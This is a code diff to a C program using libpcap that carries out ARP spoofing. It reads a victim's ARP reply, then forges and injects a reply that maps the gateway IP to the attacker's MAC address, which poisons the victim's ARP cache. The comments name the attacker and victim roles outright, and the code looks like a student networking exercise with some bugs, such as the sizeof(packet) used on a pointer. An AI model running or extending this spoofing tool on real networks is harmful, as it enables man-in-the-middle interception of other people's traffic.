@@ -66,6 +66,11 @@ void makeARP_header(struct arp_header *arph, uint16_t opcode){
 //define sender mac, ip / target mac, ip
 int main(int argc, char* argv[])
 {
+    if (argc != 4){
+        printf("check you input rightly.....\n");
+        return -1;
+    }//check input argv is right!
+
     char device[20];
     uint8_t mymac[6];
     u_char flush[42];
@@ -103,10 +108,9 @@ int main(int argc, char* argv[])
             printf("\n");
         }
     }
-
-    printf("End!\n!");
+    printf("\n");
     while(true){
-        pcap_t* handle = pcap_open_live("wlan0",1000,1,1000,errbuf);
+        pcap_t* handle = pcap_open_live(argv[1],1000,1,1000,errbuf);
         pcap_inject(handle, (u_char*)flush, sizeof(flush));
         struct pcap_pkthdr* header;
         const u_char* packet; //packet is storage of reply
@@ -115,36 +119,38 @@ int main(int argc, char* argv[])
         //it is reply packet?(opcode is in arp_header)
         arp_reply = (struct ARP_PACKET*)packet;
         if (ntohs(arp_reply->arp_h.arp_opcode) != ARPOP_REPLY){
-            printf("error!!\n");
+            printf("it is not ARP!\n");
             continue;
         }
-        //if it is reply_packet
+        //if it is reply_packet, make reply_packet
         else {
-            printf("it is ARP_PEPLY PACKET!!!!\n");
-            arp_reply->ether_h.ether_shost;
+            arp_reply->ether_h.ether_shost; // this is mac_address attacker want to know!
+            printf("\n");
             //now sender(attacker) will use gateway IP, and victim's mac(allocate to dst mac)
             uint8_t gatewayip[4];
             ip_change(argv[3], gatewayip);
-            struct ARP_PACKET *arp_reply_reply;
-            arp_reply_reply = (struct ARP_PACKET*)packet;
-            //change sender ip to gateway
-            memcpy(arp_reply_reply->arp_py.sender_ip, gatewayip, 4);
-            //target mac is victim's mac
-            memcpy(arp_reply_reply->arp_py.target_mac, arp_reply->ether_h.ether_shost, 6);
-            memcpy(arp_reply_reply->ether_h.ether_dhost, arp_reply->ether_h.ether_shost, 6);
-            //sender mac is mymac
-            memcpy(arp_reply_reply->arp_py.sender_mac, arp_reply->ether_h.ether_dhost, 6);
-            memcpy(arp_reply_reply->ether_h.ether_shost, arp_reply->ether_h.ether_dhost, 6);
-            printf("ATTACK!!");
-            for(int i = 1; sizeof(arp_reply_reply) >= i; i++){
-                printf("%02X ", packet[i - 1]);
+            //now we make arp_reply_reply packet
+            //arp_reply_reply_ethernet header
+            memcpy(&flush[0], arp_reply->ether_h.ether_shost,6); //dst_mac is victim mac
+            memcpy(&flush[6], arp_reply->ether_h.ether_dhost, 6); //src_mac is sender mac
+            memcpy(&flush[12], "\x08\x06", 2);
+            //arp_reply_reply_reply arp header (it is enough to change opcode)
+            makeARP_header(&arh, ARPOP_REPLY);
+            //arp_reply_reply arp_payload;
+            memcpy(&flush[22], arp_reply->ether_h.ether_dhost, 6); //sender mac is sender mac(mymac)
+            memcpy(&flush[28], gatewayip, 4);//sender ip is gateway ip
+            memcpy(&flush[32], arp_reply->ether_h.ether_shost, 6);//target mac is victim mac
+            memcpy(&flush[38], arp_reply->arp_py.sender_ip, 4);//target ip is victim ip
+            printf("ATTACK REPLY!!: \n");
+            for(int i = 1; sizeof(flush) >= i; i++){
+                printf("%02X ", flush[i - 1]);
                 if(i % 16 == 0){
                     printf("\n");
                 }
             }
+            printf("\n");
+            pcap_t* handle = pcap_open_live(argv[1],1000,1,1000,errbuf);
+            pcap_inject(handle, (u_char*)packet, sizeof(packet));
         }
-
-
     }
 }
-
